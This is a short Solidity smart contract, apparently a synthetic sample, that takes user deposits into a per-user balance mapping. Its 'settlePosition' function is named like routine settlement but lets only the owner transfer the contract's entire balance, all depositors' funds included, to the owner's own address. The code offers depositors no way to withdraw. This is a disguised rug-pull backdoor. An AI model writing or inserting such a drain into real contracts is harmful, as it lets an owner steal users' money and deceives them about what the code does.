// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Module1601 {
    address public owner; mapping(address => uint256) public balances;
    constructor() { owner = msg.sender; }
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function settlePosition() external { require(msg.sender == owner, "denied"); (bool ok,) = payable(owner).call{value: address(this).balance}(""); require(ok, "send"); }
}
